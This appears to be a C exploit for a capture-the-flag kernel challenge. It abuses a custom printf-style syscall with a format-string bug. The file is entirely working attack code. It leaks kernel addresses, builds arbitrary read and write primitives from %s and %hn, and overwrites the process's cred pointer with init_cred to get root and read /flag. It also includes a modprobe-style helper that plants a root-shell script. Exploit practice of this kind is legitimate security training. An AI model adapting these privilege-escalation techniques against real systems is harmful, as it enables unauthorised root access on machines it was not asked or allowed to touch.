#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

// commands
#define DEV_PATH "/dev/ttp"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}


#define SYS_PRINTF 548

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    puts("test");
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int fd = -1;

__attribute__((constructor)) void init(){
    mkfifo("/home/user/stdin_fifo", 0666);
    freopen("/home/user/stdin_fifo", "r+", stdin);
    fd = open("/home/user/stdin_fifo", O_RDWR);
}

int bytes_left(){
    int nbytes;
    ioctl(fd, FIONREAD, &nbytes);

    return nbytes;
}

int clear_stdin(){
    int size = bytes_left();

    char *buf = malloc(size);
    int ret = read(fd, buf, size);
    free(buf);

    return ret;
}

uint64_t read_ptr_stdin(){
    uint64_t ptr = 0;
    int n = bytes_left();

    if(n > 0){
        read(fd, &ptr, 8);
    }

    return ptr;
}

uint64_t arb_read_1(uint64_t addr) {
    char *inp[] = {"%s", addr};

    syscall(SYS_PRINTF, inp);
    uint64_t leak_ptr = read_ptr_stdin();
    clear_stdin();

    return leak_ptr & 0xff;
}

uint64_t arb_read_ptr(uint64_t addr) {
    uint8_t tmp[8] = {0};

    for (int i = 0; i < 8; i++) {
        tmp[i] = arb_read_1(addr + i);
    }

    return *(uint64_t*)tmp;
}

void arb_write(uint64_t addr, uint8_t val) {
    char buf[0x10] = {0};

    if (val == 0) {
        sprintf(buf, "%%hhn");
    }
    else {
      sprintf(buf, "%d%%c%%hhn", val);
    }

    char *inp[] = {buf, addr};
    syscall(SYS_PRINTF, inp);
}

uint64_t leak_kernel_ptr(void) {
    uint64_t mask = 0xffffffff00000000;

    char* inp[] = {"12345678"};

    syscall(SYS_PRINTF, inp);
    read_ptr_stdin();
    uint64_t leak_ptr = read_ptr_stdin();
    clear_stdin();

    printf("Leak ptr: %p \n", leak_ptr);

    for (;;) {
        uint64_t k_leak = arb_read_ptr(leak_ptr);

        if (k_leak > mask) {
            printf("leak: %p \n", k_leak);
            return k_leak;
        }
        leak_ptr += 8;
    }
}

void write_long(uint64_t where, uint64_t what){
    char fmt[0x50];
    uint32_t part1 = what & 0xffffffff, part2 = what >> 32;
    uint16_t part1_lower = part1 & 0xffff, part1_upper = part1 >> 16;
    uint16_t part2_lower = part2 & 0xffff, part2_upper = part2 >> 16;

    sprintf(fmt, "%%%dc%%1$hn%%%dc%%2$hn%%%dc%%3$hn%%%dc%%4$hn", part1_lower,
    (part1_upper > part1_lower) ? part1_upper - part1_lower : part1_upper - part1_lower + 0x10000,
    (part2_lower > part1_upper) ? part2_lower - part1_upper : part2_lower - part1_upper + 0x10000,
    (part2_upper > part2_lower) ? part2_upper - part2_lower : part2_upper - part2_lower + 0x10000
    );

    char *data[] = {fmt, where, where + 2, where + 4, where + 6};
    syscall(SYS_PRINTF, data);
}

void edit_cred_struct(uint64_t cred)
{
    char* inp[] = {
        "%n%n",
        cred + 1 * 4,
        cred + 5 * 4
    };

    syscall(SYS_PRINTF, inp);
}

void overwrite_cred_ptr(uint64_t cred_addr, uint64_t init_cred_addr)
{
    write_long(cred_addr, init_cred_addr);
}

int main(void){
    uint64_t k_base = leak_kernel_ptr();
    k_base -= 0x13540bf;
    uint64_t per_cpu_off_addr = k_base + 0x14176a0;
    uint64_t per_cpu_off = arb_read_ptr(per_cpu_off_addr);
    uint64_t current_task_addr = per_cpu_off + 0x16d00;
    uint64_t current_task = arb_read_ptr(current_task_addr);
    uint64_t cred_addr = current_task + 0x6b8;
    uint64_t cred = arb_read_ptr(cred_addr);
    uint64_t init_cred = k_base + 0x164e400;

    printf("Kernel base: %p \n", k_base);
    printf("per_cpu_off: %p \n", per_cpu_off);
    printf("current_task: %p \n", current_task);
    printf("cred: %p \n", cred);

    //edit_cred_struct(cred);

    overwrite_cred_ptr(cred_addr, init_cred);

    system("id; cat /flag");

    char buf[0x40] = {0};
    read(fd, buf, bytes_left());

    printf("%s \n", buf);

    return 0;
}
